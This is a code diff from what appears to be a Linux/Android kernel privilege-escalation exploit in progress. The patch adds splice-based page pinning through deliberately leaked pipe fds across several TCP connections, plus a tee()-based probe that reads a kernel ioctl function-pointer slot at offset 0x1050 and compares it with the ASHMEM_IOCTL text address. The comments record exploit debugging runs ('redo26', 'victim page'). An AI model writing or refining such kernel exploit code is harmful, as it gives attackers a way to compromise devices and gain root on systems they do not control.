@@ -1976,6 +1976,56 @@ void close_reclaim_sockets(void) {
 
 int reclaim_recv_fd(void) { return reclaim_sv[1]; }
 
+/* fix74c (redo26): the hold pipes are the only refcount holder left for
+ * the victim page once the payload skb is consumed, yet redo26 pinned
+ * conn0's FULL second-round payload (425984 == 13*32768, SIOCINQ exact
+ * and the second round rebuilt all 8 TCP conns so no first-round residue
+ * can hide the victim) and the table still zeroed at win+1..3s
+ * (ioctl slot -> NULL -> ENOTTY).  Static analysis cannot separate
+ * "the receive path copied the data, so the pipe holds a DIFFERENT page"
+ * from "the pipe never held the page at all".  tee() the first hold
+ * pipe (copies pipe_buffer references, does not consume the source) and
+ * dump the ioctl slot at buf+0x1050:
+ *   ALIVE after base died  -> pin copied a different page (receive-path
+ *                             copy; splicing can never save the victim)
+ *   ZERO                   -> the pipe never held / lost the page
+ *   DIFF                   -> a writer is actively mutating the page  */
+static int ks_hold_fds[96];
+static int ks_hold_cnt;
+static void ks_hold_add(int fd) {
+  if (fd >= 0 && ks_hold_cnt < (int)(sizeof(ks_hold_fds) / sizeof(int)))
+    ks_hold_fds[ks_hold_cnt++] = fd;
+}
+void ks_hold_dump(const char *tag) {
+  if (ks_hold_cnt <= 0)
+    return;
+  int tp[2] = {-1, -1};
+  if (pipe(tp) != 0) {
+    pr_warning("hold dump %s pipe errno=%d\n", tag, errno);
+    return;
+  }
+  ssize_t t = tee(ks_hold_fds[0], tp[1], 0x1100, SPLICE_F_NONBLOCK);
+  if (t <= 0) {
+    pr_warning("hold dump %s tee=%zd errno=%d pipes=%d\n", tag, t, errno,
+               ks_hold_cnt);
+  } else {
+    char buf[0x1100];
+    ssize_t r = read(tp[0], buf, sizeof(buf));
+    if (r >= 0x1058) {
+      uint64_t v = 0;
+      memcpy(&v, buf + 0x1050, 8);
+      uint64_t want = (uint64_t)text_addr(ASHMEM_IOCTL);
+      pr_info("hold dump %s tee=%zd read=%zd slot1050=%llx want=%llx %s\n",
+              tag, t, r, (unsigned long long)v, (unsigned long long)want,
+              v == want ? "ALIVE" : (v == 0 ? "ZERO" : "DIFF"));
+    } else {
+      pr_warning("hold dump %s read=%zd short\n", tag, r);
+    }
+  }
+  close(tp[0]);
+  close(tp[1]);
+}
+
 void close_ctx_memfds(struct mm_ctx *ctx) {
   for (size_t i = 0; i < ctx->mm_cnt; i++) {
     if (ctx->memfds[i] > 0) {
@@ -4206,6 +4256,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           ssize_t sp = splice(keep_srv[hit_c], NULL, hp[1], NULL, chunk,
                               SPLICE_F_NONBLOCK);
           if (sp <= 0) break;
+          ks_hold_add(hp[0]);
           npipe++;
           pin_bytes += (int)sp;
           remain -= (int)sp;
@@ -4216,6 +4267,46 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       }
       pr_info("payload pin splice conn=%d bytes=%d pipes=%d rounds=%d\n",
               hit_c, pin_bytes, npipe, rounds);
+      /* fix74a (redo26): pin EVERY keep conn, not just hit_c.  The tp
+       * hit_i accounting is asynchronous (perf counter fires after the
+       * send), so the victim skb may ride a neighbouring conn's queue
+       * while the log says hit_c -- redo22/26 pinned a single conn's
+       * exact payload and only the second-round redo26 died.  Single
+       * pass, no wait: every conn finished sending before the gate. */
+      {
+        int extra_bytes = 0, extra_pipes = 0;
+        for (int pc = 0; pc < nconn && npipe < 96; pc++) {
+          if (pc == hit_c)
+            continue;
+          int q = -1;
+          if (ioctl(keep_srv[pc], SIOCINQ, &q) != 0 || q <= 0)
+            continue;
+          int remain = q;
+          while (remain > 0 && npipe < 96) {
+            int hp[2] = {-1, -1};
+            if (pipe(hp) != 0)
+              break;
+            size_t chunk = remain > 65536 ? 65536 : (size_t)remain;
+            ssize_t sp = splice(keep_srv[pc], NULL, hp[1], NULL, chunk,
+                                SPLICE_F_NONBLOCK);
+            if (sp <= 0) {
+              close(hp[0]);
+              close(hp[1]);
+              break;
+            }
+            ks_hold_add(hp[0]);
+            npipe++;
+            extra_pipes++;
+            extra_bytes += (int)sp;
+            remain -= (int)sp;
+            if ((size_t)sp < chunk) break;
+          }
+        }
+        if (extra_pipes)
+          pr_info("payload pin extra conns bytes=%d pipes=%d\n",
+                  extra_bytes, extra_pipes);
+      }
+      ks_hold_dump("pin");
       /* Pipe fds leak on purpose: closing them releases the pages. */
     }
   }
